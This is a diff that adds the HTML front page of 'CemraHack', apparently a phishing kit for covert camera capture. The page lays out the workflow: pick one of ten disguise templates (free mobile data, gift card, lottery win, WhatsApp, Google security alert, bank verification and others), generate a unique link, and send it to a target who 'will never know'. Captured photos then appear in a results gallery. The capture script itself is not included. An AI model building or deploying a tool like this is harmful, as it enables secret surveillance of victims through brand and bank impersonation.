@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CemraHack — Capture Intelligence</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=Space+Grotesk:wght@400;500;700&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+
+<body class="page-home">
+
+    <div class="bg-grid"></div>
+    <div class="bg-glow glow-1"></div>
+    <div class="bg-glow glow-2"></div>
+    <div class="bg-glow glow-3"></div>
+    <div class="particles" id="particles"></div>
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-logo">
+            <i class="fa-solid fa-camera-retro"></i>
+            <span>Cemra<b>Hack</b></span>
+        </div>
+        <div class="nav-status">
+            <span class="status-dot"></span>
+            <span>System Online</span>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <main class="hero">
+        <div class="hero-badge">
+            <i class="fa-solid fa-bolt"></i>
+            Advanced Camera Intelligence
+        </div>
+
+        <h1 class="hero-title">
+            Select a Disguise.<br />
+            <span class="gradient-text">Send. Capture.</span>
+        </h1>
+
+        <p class="hero-sub">
+            Pick one of 10 custom disguised pages below. Generate a unique link,<br />
+            send it to your target — they'll never know what it really is.
+        </p>
+
+        <!-- STEP FLOW -->
+        <div class="steps-row">
+            <div class="step-card" data-step="1">
+                <div class="step-icon"><i class="fa-solid fa-palette"></i></div>
+                <div class="step-num">01</div>
+                <h3>Pick Disguise</h3>
+                <p>Choose from 10 fake page styles</p>
+            </div>
+            <div class="step-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+            <div class="step-card" data-step="2">
+                <div class="step-icon"><i class="fa-solid fa-link"></i></div>
+                <div class="step-num">02</div>
+                <h3>Generate Link</h3>
+                <p>Create a unique disguised capture URL</p>
+            </div>
+            <div class="step-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+            <div class="step-card" data-step="3">
+                <div class="step-icon"><i class="fa-solid fa-paper-plane"></i></div>
+                <div class="step-num">03</div>
+                <h3>Send to Target</h3>
+                <p>Share through any channel</p>
+            </div>
+            <div class="step-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+            <div class="step-card" data-step="4">
+                <div class="step-icon"><i class="fa-solid fa-images"></i></div>
+                <div class="step-num">04</div>
+                <h3>View Results</h3>
+                <p>Captured photos appear in gallery</p>
+            </div>
+        </div>
+
+        <!-- ==============================
+         THEME PICKER
+    ================================ -->
+        <div class="section-label">
+            <i class="fa-solid fa-masks-theater"></i>
+            Choose Your Disguise Template
+            <span class="section-pill">10 Styles</span>
+        </div>
+
+        <div class="themes-grid" id="themesGrid">
+
+            <!-- 1. Free Mobile Data -->
+            <div class="theme-card selected" data-theme="freedata" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#e11d48,#7c3aed)">
+                    <i class="fa-solid fa-signal"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">FREE 10GB</div>
+                        <div class="tp-sub">Mobile Data Offer</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Free Mobile Data</span>
+                    <span class="theme-tag">Telecom</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 2. Free Gift Card -->
+            <div class="theme-card" data-theme="giftcard" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#f97316,#eab308)">
+                    <i class="fa-solid fa-gift"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">🎁 $50 Gift</div>
+                        <div class="tp-sub">Claim Your Reward</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Gift Card Reward</span>
+                    <span class="theme-tag">Shopping</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 3. Lucky Winner -->
+            <div class="theme-card" data-theme="lucky" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#059669,#0284c7)">
+                    <i class="fa-solid fa-trophy"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">🏆 YOU WON!</div>
+                        <div class="tp-sub">Lucky Draw Winner</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Lucky Winner</span>
+                    <span class="theme-tag">Lottery</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 4. Video Verification -->
+            <div class="theme-card" data-theme="video" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#dc2626,#1e1b4b)">
+                    <i class="fa-solid fa-play-circle"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">▶ Premium</div>
+                        <div class="tp-sub">Video Verification</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Video Verification</span>
+                    <span class="theme-tag">Streaming</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 5. WhatsApp Verification -->
+            <div class="theme-card" data-theme="whatsapp" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#16a34a,#15803d)">
+                    <i class="fa-brands fa-whatsapp"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">WhatsApp</div>
+                        <div class="tp-sub">Account Verification</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">WhatsApp Verify</span>
+                    <span class="theme-tag">Messaging</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 6. Google Security -->
+            <div class="theme-card" data-theme="google" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#1d4ed8,#2563eb)">
+                    <i class="fa-brands fa-google"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">Security Alert</div>
+                        <div class="tp-sub">Verify Your Identity</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Security Check</span>
+                    <span class="theme-tag">Google Style</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 7. Instagram Offer -->
+            <div class="theme-card" data-theme="instagram" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#9333ea,#e11d48,#f97316)">
+                    <i class="fa-brands fa-instagram"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">Instagram</div>
+                        <div class="tp-sub">Special Offer for You</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Instagram Offer</span>
+                    <span class="theme-tag">Social</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 8. Bank Verification -->
+            <div class="theme-card" data-theme="bank" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#0f172a,#1e3a5f)">
+                    <i class="fa-solid fa-building-columns"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">Bank Alert</div>
+                        <div class="tp-sub">Verify Your Account</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Bank Verification</span>
+                    <span class="theme-tag">Finance</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 9. Speed Test -->
+            <div class="theme-card" data-theme="speedtest" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#0e7490,#0284c7)">
+                    <i class="fa-solid fa-gauge-high"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">Speed Test</div>
+                        <div class="tp-sub">Test Your Connection</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Speed Test App</span>
+                    <span class="theme-tag">Utility</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+            <!-- 10. Free Music -->
+            <div class="theme-card" data-theme="music" onclick="selectTheme(this)">
+                <div class="theme-preview" style="background:linear-gradient(135deg,#7c3aed,#06b6d4)">
+                    <i class="fa-solid fa-music"></i>
+                    <div class="theme-preview-text">
+                        <div class="tp-title">🎵 Free Music</div>
+                        <div class="tp-sub">Download Now</div>
+                    </div>
+                </div>
+                <div class="theme-meta">
+                    <span class="theme-name">Free Music App</span>
+                    <span class="theme-tag">Entertainment</span>
+                </div>
+                <div class="theme-check"><i class="fa-solid fa-check"></i></div>
+            </div>
+
+        </div>
+
+        <!-- Selected theme badge -->
+        <div class="selected-theme-badge" id="selectedBadge">
+            <i class="fa-solid fa-masks-theater"></i>
+            Selected: <strong id="selectedThemeName">Free Mobile Data</strong>
+            <span class="badge-ok"><i class="fa-solid fa-check"></i></span>
+        </div>
+
+        <!-- CONTROL PANEL -->
+        <div class="control-panel">
+            <div class="panel-header">
+                <i class="fa-solid fa-terminal"></i>
+                <span>Link Generator</span>
+                <div class="panel-lights">
+                    <span class="light red"></span>
+                    <span class="light yellow"></span>
+                    <span class="light green"></span>
+                </div>
+            </div>
+            <div class="panel-body">
+                <div class="field-group">
+                    <label>Session ID</label>
+                    <div class="session-display">
+                        <span id="sessionId">--</span>
+                        <button class="btn-icon" onclick="regenerateSession()" title="Regenerate">
+                            <i class="fa-solid fa-rotate"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <label>Your Disguised Capture Link</label>
+                    <div class="link-box" id="linkBox">
+                        <i class="fa-solid fa-lock"></i>
+                        <span id="generatedLink">Pick a theme above, then click Generate...</span>
+                    </div>
+                </div>
+                <div class="action-row">
+                    <button class="btn-primary" id="generateBtn" onclick="generateLink()">
+                        <i class="fa-solid fa-wand-magic-sparkles"></i>
+                        Generate Link
+                    </button>
+                    <button class="btn-secondary" id="copyBtn" onclick="copyLink()" disabled>
+                        <i class="fa-solid fa-copy"></i>
+                        Copy Link
+                    </button>
+                    <button class="btn-results" onclick="goToResults()">
+                        <i class="fa-solid fa-images"></i>
+                        View Results
+                    </button>
+                </div>
+            </div>
+            <div class="status-bar" id="statusBar">
+                <i class="fa-solid fa-circle-info"></i>
+                <span id="statusText">Ready — Pick a disguise and generate your link</span>
+            </div>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-row">
+            <div class="stat">
+                <span class="stat-num" id="statSessions">0</span>
+                <span class="stat-label">Active Sessions</span>
+            </div>
+            <div class="stat">
+                <span class="stat-num" id="statCaptures">0</span>
+                <span class="stat-label">Total Captures</span>
+            </div>
+            <div class="stat">
+                <span class="stat-num">99.9%</span>
+                <span class="stat-label">Success Rate</span>
+            </div>
+        </div>
+    </main>
+
+    <div class="toast" id="toast">
+        <i class="fa-solid fa-check-circle"></i>
+        <span id="toastMsg">Link copied!</span>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
